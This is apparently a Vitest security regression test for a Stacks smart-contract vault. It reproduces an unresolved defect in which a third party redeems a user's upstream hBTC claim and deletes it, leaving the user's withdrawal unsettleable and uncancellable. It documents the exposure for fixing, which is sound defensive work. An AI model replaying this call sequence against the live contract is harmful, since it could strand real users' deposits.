import { beforeEach, describe, expect, it } from 'vitest';
import { Cl } from '@stacks/transactions';

/** Reproduces an unresolved defect in the immutable v6 integration.
 * PASS means the exposure is reproducible, not that the live integration is safe.
 * Uses the existing local hBTC accounting shim, whose permissionless redeem and
 * claim deletion match the published upstream source. It does NOT validate real
 * mainnet funding, token movement, cooldown or blacklist behavior.
 */
const accounts = simnet.getAccounts();
const owner = accounts.get('deployer')!;
const user = accounts.get('wallet_1')!;
const stranger = accounts.get('wallet_2')!;
const oracle1 = accounts.get('wallet_3')!;
const oracle2 = accounts.get('wallet_4')!;
const hbtc = 'SP1S1HSFH0SQQGWKB69EYFNY0B1MHRMGXR3J1FH4D.vault-hbtc-v1-2';
const token = Cl.contractPrincipal(owner,'mock-sbtc');
const adapter = Cl.contractPrincipal(owner,'hermetica-hbtc-adapter');
beforeEach(() => {
  simnet.callPublicFn('mock-sbtc','mint',[Cl.uint(10000),Cl.principal(user)],owner);
  simnet.callPublicFn('vault-v6','set-sbtc-token',[token],owner);
  simnet.callPublicFn('vault-v6','approve-adapter',[adapter,Cl.bool(true)],owner);
  simnet.callPublicFn('hermetica-hbtc-adapter','set-vault',[Cl.contractPrincipal(owner,'vault-v6')],owner);
  simnet.callPublicFn('hermetica-hbtc-adapter','set-oracle-at',[Cl.uint(0),Cl.principal(oracle1)],owner);
  simnet.callPublicFn('hermetica-hbtc-adapter','set-oracle-at',[Cl.uint(1),Cl.principal(oracle2)],owner);
  simnet.callPublicFn('hermetica-hbtc-adapter','set-apy',[Cl.uint(800)],oracle1);
  simnet.callPublicFn('hermetica-hbtc-adapter','set-apy',[Cl.uint(800)],oracle2);
});
describe('UNRESOLVED v6 Hermetica security regression', () => {
  it('third-party redemption deletes upstream claim and prevents adapter settlement or cancellation', () => {
    expect(simnet.callPublicFn('vault-v6','deposit-async',[token,adapter,Cl.uint(10000)],user).result).toBeOk(Cl.uint(10000));
    expect(simnet.callPublicFn('vault-v6','request-withdraw',[adapter],user).result).toBeOk(Cl.uint(1));
    expect(simnet.callPublicFn(hbtc,'fund-claim',[Cl.uint(1)],owner).result).toBeOk(Cl.uint(10000));
    expect(simnet.callPublicFn(hbtc,'redeem',[Cl.uint(1)],stranger).result).toBeOk(Cl.uint(10000));
    expect(simnet.callReadOnlyFn(hbtc,'get-claim',[Cl.uint(1)],user).result).toBeErr(Cl.uint(103003));
    expect(simnet.callPublicFn('vault-v6','claim-withdraw',[token,adapter],user).result).toBeErr(Cl.uint(103003));
    expect(simnet.callPublicFn('vault-v6','cancel-withdraw',[adapter],user).result).toBeErr(Cl.uint(103003));
    expect(simnet.callReadOnlyFn('vault-v6','get-total-deposited',[],user).result).toBeUint(10000);
    expect(simnet.callReadOnlyFn('mock-sbtc','get-balance',[Cl.principal(`${owner}.hermetica-hbtc-adapter`)],user).result).toBeOk(Cl.uint(10000));
  });
});
